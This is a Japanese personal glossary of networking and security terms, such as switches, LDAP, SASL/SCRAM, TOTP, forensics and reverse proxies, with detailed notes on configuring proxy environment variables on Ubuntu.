    L2 スイッチ: #// レイヤー2スイッチ。ハブ。OSI参照モデルのデータリンク層にあたる スイッチング HUB, カスケード接続ができる。最近（2008年）はスイッチングがあるハブが普通
    L3 スイッチ: #// レイヤー3スイッチ。ルーター。OSI参照モデルのネットワーク層にあたる
        #ref: https://community.fs.com/jp/blog/layer-2-switch-vs-layer-3-switch-what-is-the-difference.html
        関連: #search: 家庭内 LAN
    LDAP:  #// エルダップ。ディレクトリサービスに接続するためのプロトコル
        Windows の Active Directory との関係:
            Active Directory は LDAP をサポートしていますが他もサポートしています
    MAC アドレス: #keyword:
        mac: #keyword: mac MAC アドレス
            りんご >> システム設定 >> ネットワーク >> Wi-Fi（など）>>（ルーター名）詳細 >> ハードウェア >> MAC アドレス
            #search: mac IP アドレス
    netfilter:
        カーネルフレームワーク（パケット処理の仕組み）
    NOC: #// Network Operation Center、ネットワークを管理する場所や人、組織
    pps: #// packets per second
    referer, referrer:  #// サイト訪問したユーザーが1つ前に閲覧したWebサイト。referer はスペルミスだけど MDN は使っている
    SA ユーザー: #// SQL Server の管理者アカウント
    SASE: #//（サシー） Secure Access Service Edge
        社員に対する セキュリティ サービス と ネットワーク サービス の融合
        #ref: https://www.ntt.com/business/lp/sase.html
    SASL: #keyword:  #// プロトコルにユーザー認証の機能を付け加えるための共通仕様
    SASL/SCRAM: #keyword:  #// Salted Challenge Response Authentication Mechanism (SCRAM)
        _: クライアントとサーバー間でパスワード・ベースの認証を実行。
            通信そのものの暗号化は行いません。
        #search: Kafka SASL
        #ref: https://www.ibm.com/docs/ja/app-connect/12.0?topic=messages-authenticating-connections-kafka-cluster-by-using-saslscram
    SNTP: #// サーバーなどの状態監視、リソース監視、パフォーマンス監視、トラフィック監視を行うための、SNMPマネージャとSNMPエージェント間での通信プロトコル
    SNTP trap:  #// SNMPエージェントからSNMPマネージャへの通知
        #ref: https://e-words.jp/w/SNMPトラップ.html
    squid: #// プロキシーサーバーの１つ
    SSID: #// 無線LAN（Wi-Fi）におけるアクセスポイントの識別名
    SSLサーバ証明書: #// 認証局から発行される。HTTPSに必要  https://jp.globalsign.com/ssl-pki-info/ssl_beginner/aboutssl.html
        #search: SSL証明書
    SSLプロファイル: #// SSLサーバ証明書など、暗号化通信のための設定。 SSL クライアント プロファイル と SSL サーバー プロファイル があります。
        サーバ証明書適用手順(1) SSLプロファイル  https://www.jcert.co.jp/support/pdf/csr/10CSR_BigIP_F5.pdf
        https://docs.vmware.com/jp/VMware-NSX-T-Data-Center/2.3/com.vmware.nsxt.admin.doc/GUID-ECA52FDF-EB3F-44C9-9E2C-03C8CA5EED06.html
    TOTP:  #keyword: TOTP, Time-based One-Time Password, token
        参考: https://www.itmedia.co.jp/news/articles/1904/08/news026_3.html
        TOTP アプリ:
            Google Authenticator: #keyword:
            Microsoft Authenticator: #keyword:
                アカウントを追加します:
                    ＋（右上）>> その他 >> カメラで QR コードを写す
        HSM: #keyword:  #// Hardware Security Module
    TTL: #// 生存期間
        以下のいずれか:
            生存期間: 時間
            ルータを通過できる最大回数: ルータは 1ずつ減らし、0なら破棄する。
                初期値は、0x80 ぐらい。 ping の -i コマンドで指定可能。
        参考: #ref: ${programming}/ネットワーク・セキュリティ/基礎から学ぶWindowsネットワーク/winnet.svg#ttl
    VIP: #// Virtual IP (address)  仮想IPアドレス  #search: VIP
    VTP: #// VLAN Trunking Protocol。シスコ独自。スイッチネットワーク全体でVLAN情報を同期します。
    アノマリ検知:  #// 異常検知
        アノマリ型: 不審な動きをしているなどから検知すること。逆にシグネチャ型は完全一致で検知
            #ref: https://it-trend.jp/ids-ips/article/257-0029
    インシデント:  #// 軽微な事象  #ref: https://e-words.jp/w/インシデント.html
    カスケード接続: #// ハブとハブをカスケード用のポートまたはクロスケーブルで接続すること。
        それぞれのハブはそれぞれのノードになります。
        https://www.allied-telesis.co.jp/library/nw_guide/device/hub.html#004
        #ref: ${my_images}/2021/LAN_cascade.png
        #ref: ${my_images}/2021/LAN_cascade_allied_telesis.png
        #ref: スタック接続
    クレデンシャル: #// ユーザID と パスワード。アクセス トークン（または単にトークン）のことを指す場合もある
        #ref: https://www.f5.com/ja_jp/services/resources/glossary/credential
    ゴシップ プロトコル:  #// gossip protocol. 結果整合性。ランダムに選んだ相手と情報を交換し、自身が持つデータの更新を繰り返します。情報の拡散や統計値の計算などに利用されます
        参考: https://ja.wikipedia.org/wiki/ゴシッププロトコル
    スイッチング HUB: #search: L2 スイッチ
    スタック接続: #// 複数のハブが１つのノードになるように、ハブとハブを専用ケーブルまたは専用ラックで接続すること。
        関連:  #search: カスケード接続
    セッションID: #search: アクセス トークン
        セッション ベース の認証:
            クッキーを使います  #search: Cookie
    トークン: #search: アクセス トークン
    トポロジー, topology: #// ネットワークの形態。またはネットワークそのもの
    パケット: #keyword: packet,  Network packet
        _: NIC から見た 1回の送信または受信のかたまり。
        関連:
            フレーム:  #search: Network frame
    フォレンジック: #keyword: forensics
        デジタル フォレンジック: 証拠。IT機器の中に残された証拠を調査・解析すること。
            証拠保全, 解析（整理）, 分析（証拠）, 報告
            #ref: https://www.ines-solutions.com/industry/a265
        元の意味: 法廷の, 法医学の, 法的に有効な
        関連: #search: 被害の範囲
    プライベート アドレス, アドレスクラス:  #search: IP private address
    フレーム（通信）: #keyword: Network frame
        _: １つ以上のパケットからなるソフトウェアから見た 1回の送信または受信のかたまり
        関連:
            パケット:  #search: packet
    プロキシー: #keyword: proxy
        機能:
            FQDN 部分を内部向けの IP アドレスと、外部向けの IP アドレスに変えます:
                #search: docker build proxy IP address
        構成:
            proxy 環境変数:  #keyword: Linux HTTP_PROXY, proxy, プロキシ環境にいる場合
                プロキシー:  #search: proxy
                プロキシ関連の環境変数を設定します:  #keyword: Linux proxy, bash proxy
                    Ubuntu:  #search: Ubuntu Linux proxy
                        環境変数を設定します:
                            ユーザーに設定する場合:
                                (bash):
                                    nano  ~/.bashrc  : |  #// 最も下へ追記  #search: __Company__ Ubuntu
                                        export  http_proxy="http://____"
                                        export  https_proxy="http://____"
                                        export  no_proxy="127.0.0.1, localhost"
                                        export  ftp_proxy="http://____"
                                    #ref: https://code.visualstudio.com/docs/setup/network
                            OS に設定する場合:
                                (bash):
                                    cat <<_HERE_DOCUMENT | sudo tee /etc/profile > /dev/null
                                    export http_proxy=http://__Proxy__:8080/
                                    export https_proxy=http://__Proxy__:8080/
                                    export no_proxy=localhost,127.0.0.1
                                    export ftp_proxy=http://__Proxy__:8080/
                                    _HERE_DOCUMENT
                                #// インデントを削除して実行してください
                        設定をすぐに有効にします:
                            (bash$):
                                source ~/.bashrc
                        sudo したときにも環境変数の値を継承させるように設定します:
                            #search: Ubuntu env_keep
                    CentOS:  #search: CentOS7 Linux proxy
                環境変数一覧:  #glossary: Linux
                    http_proxy, HTTP_PROXY:  http://proxy.____:____ （使っている人に聞く）
                        #// http://${proxy_user}:${proxy_pass}@${proxy_host}:${proxy_port}
                    https_proxy, HTTPS_PROXY: http://proxy.____:____ （使っている人に聞く）
                    FTP_PROXY:   http://proxy.____:____ （使っている人に聞く）
                    no_proxy, NO_PROXY:  #keyword: NO_PROXY,  bypass proxy  プロキシをバイパスします  #ref: https://stackoverflow.com/questions/16538372/git-proxy-bypass
                        例: localhost, 127.0.0.1, 192.168.*, control, node*, node1, db*, db1
                        例2: localhost, 127.0.0.1, .local, 172.17.0.1, 172.18.0.1, 172.19.0.1, 172.20.0.1, host.docker.internal, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
                        例2の値の意味:
                            個別IPアドレス・ホスト名:
                                localhost: ローカルホストの名前
                                127.0.0.1: ローカルループバックアドレス
                                .local: mDNSローカルドメイン
                                172.17.0.1, 172.18.0.1, 172.19.0.1, 172.20.0.1: Dockerの一般的なデフォルトゲートウェイIP
                                host.docker.internal: DockerでホストOSにアクセスするための特別なホスト名
                            ネットワーク範囲（CIDR記法）:
                                10.0.0.0/8: プライベートIPアドレス範囲A（10.0.0.0 ～ 10.255.255.255）
                                172.16.0.0/12: プライベートIPアドレス範囲B（172.16.0.0 ～ 172.31.255.255）
                                192.168.0.0/16: プライベートIPアドレス範囲C（192.168.0.0 ～ 192.168.255.255）
                        ワイルドカードが使えないソフト: curl
                        対処法A:  ワイルドカードを使わないで１つずつ設定します
                        対処法B:  ブレース展開を使います  #// ただし環境変数に長大なIPリストができてしまう
                            #// https://sechiro.hatenablog.com/entry/2013/08/06/no_proxy_にネットワークアドレスとかワイルドカードを
                    root ユーザーや sudo の場合:  #search: proxy sudo
                環境変数を設定するファイル:  #search: /etc/profile.d/proxy.sh
                sudo したとき: #keyword: proxy sudo
                    コマンドに環境変数を指定する場合:
                        sudo http_proxy=${http_proxy} https_proxy=${https_proxy}  __CommandLine__
                    環境変数を継承する設定:  #search: sudoers env_keep
                プログラム固有のプロキシ設定:
                    Docker: #search: Docker proxy
                    yum:
                        sudo nano  /etc/yum.conf : #// 保存したらすぐに新しい設定の yum コマンドが使えます
                            proxy=http://___.___.___.__:____/
            IP アドレス:  #// 外部から見える IP アドレス
                変わるかどうか:
                    固定, 静的プロキシ: プロキシ サーバー の IP アドレス
                    回転プロキシ: プロキシ サーバー が複数の IP アドレスを持っていてローテーションします
                    負荷分散: ルーティングによって変わります
                    VPN: 変わります
                調べる:  #// 外部から見える IP アドレス が何番かを調べます
                    難しいです  #ref: ${typrm_files}/ref/Network-AI.yaml#label: proxy IP address
            NAT との違い: #keyword: diff NAT proxy  #search: NAT
                -   プロキシーにはキャッシュがあります。
                -   プロキシーは HTTP(S) FTP のみ対応しています。SSH 等は対応していません
        ファイル:  #glossary:
            /etc/profile.d/proxy.sh:  #// プロキシの環境変数 https_proxy などを設定する標準的な場所。通常、.bashrc には設定しません
                #search: /etc/profile.d
        関連:  #search: リバース プロキシー
        トラブルシューティング:  #search: proxy DNS trouble
    ミチゲーション: #// 直訳は緩和（装置）。DDoS攻撃に該当するパケットのみをドロップし、他のクリーンなパケットは透過する仕組み
        #ref: https://www.nttpc.co.jp/technology/ddos.html
    リクエスト: #keyword:  #// 要求
    リバース プロキシー, reverse proxy:  #// サーバーの代わり。外部インターネットからサーバーへアクセスされる通信を中継する仕組み。DNAT を含む
        #keyword: リバースプロキシ
        リバース プロキシー: サーバーの代わり
            社外クライアントからのリクエストに社内 Web サーバーが応答するときの間に入るマシーン。
            （社内 ← ）プロキシ ← 社外
            1 → 多  へ 分散
            公開 → 保護
        プロキシ（リバースではない）: クライアントの代わり
            社内からインターネットへリクエストするときの間に入るマシーン。SNAT を含む
            社内 → プロキシ（ → 社外）
            多 → 1  へ まとめ
            保護 → 公開
        Squid: #// Proxyサーバーの 1つ
        関連: #search: BFF
    レスポンス: #keyword:  #// 応答
    レピュテーション システム: #// ダウンロードしたり閲覧したりする前に評価して、危険なら遮断する技術
        参考:
            - https://is702.jp/special/683/#03
            - https://docs.trendmicro.com/ja-jp/smb/worry-free-business-security-90-sp3-server-help/introducing-wfbs-sta/key-features-and-ben/file-reputation-serv.aspx
    ロードバランサー: #// 負荷分散装置。トラフィックをルーティングします
    ローリング アップデート: #// 複数あるサーバーを少しずつバージョンアップしていきます。
        サービスを停止させずにバージョンアップができます。
        https://www.designet.co.jp/ossinfo/kubernetes/update/
